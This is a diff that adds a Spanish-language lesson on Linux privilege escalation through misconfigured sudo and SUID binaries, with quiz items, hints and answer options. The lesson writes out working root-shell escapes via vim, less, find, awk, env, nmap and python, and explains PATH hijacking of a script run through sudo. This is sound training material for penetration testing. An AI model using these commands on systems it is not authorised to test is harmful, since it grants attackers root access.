@@ -1,0 +1,71 @@
+---
+index: 2
+title: "SUDO mal configurado y SUID: los dos caballos de batalla"
+questions:
+  - id: privesc-linux-t02-q01
+    prompt: "sudo -l muestra: (ALL) NOPASSWD: /usr/bin/vim. ¿Cómo escalar a root?"
+    hint: "Vim puede ejecutar comandos de shell. GTFOBins: vim -c ':!bash'"
+    kind: text
+  - id: privesc-linux-t02-q02
+    prompt: "Encuentras -rwsr-xr-x root root /usr/bin/find. ¿Qué hace GTFOBins con find SUID?"
+    hint: "find -exec comando \\;"
+    kind: text
+  - id: privesc-linux-t02-q03
+    prompt: "¿Por qué 'sudo less /var/log/syslog' es un vector de escalada?"
+    hint: "less tiene escape a shell (!cmd) — GTFOBins lo documenta."
+    kind: choice
+    options:
+      - id: a
+        label: "No lo es: less es inofensivo"
+      - id: b
+        label: "less (y vim, more, man) permiten ejecutar comandos desde dentro — con sudo = shell root"
+      - id: c
+        label: "Solo si eres root ya"
+      - id: d
+        label: "Porque lee contraseñas del log"
+---
+
+## SUDO: el vector #1 real
+
+`sudo -l` te dice qué puedes ejecutar sin password. La regla de oro: **si puedes
+ejecutar CUALQUIER binario que tenga escape a shell, tienes root**.
+
+```bash
+# Los clásicos de GTFOBins (todos con sudo delante):
+sudo vim -c ':!bash'                  # vim → shell
+sudo less /etc/shadow                 # less → !sh dentro
+sudo find / -exec /bin/bash \;        # find -exec
+sudo awk 'BEGIN {system("/bin/bash")}' # awk system()
+sudo env /bin/bash                    # env ejecuta un binario
+sudo nmap --interactive               # nmap viejo → !sh
+```
+
+**La regla**: antes de intentar exploit complejo, mira `sudo -l` + GTFOBins.sh.
+
+## SUID: el bit que otorga poderes
+
+Ya conoces SUID de CS101. Ahora, la explotación:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Los SUID que DEBES buscar en GTFOBins:
+- `find`, `vim`, `less`, `more`, `awk`, `env`, `nmap`, `bash`, `cp`, `mv`, `python`
+- Cualquier binario con SUID root que no esté en la lista "esperada" (passwd, sudo,
+  ping, su, mount)
+
+```bash
+# Si find es SUID root:
+find . -exec /bin/bash -p \;         # -p preserva el bit SUID → bash root
+
+# Si python es SUID:
+python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
+```
+
+## La pregunta del millón
+
+¿Y si `sudo -l` muestra `(root) NOPASSWD: /opt/mi_script.sh`? Ese script NO está en
+GTFOBins... pero ¿qué hace? Si llama a comandos SIN ruta absoluta (`tar` en vez de
+`/usr/bin/tar`), puedes hacer **PATH hijacking**: crear tu propio `tar` en /tmp,
+modificar PATH, y cuando el script lo llame... ejecuta TU binario como root.
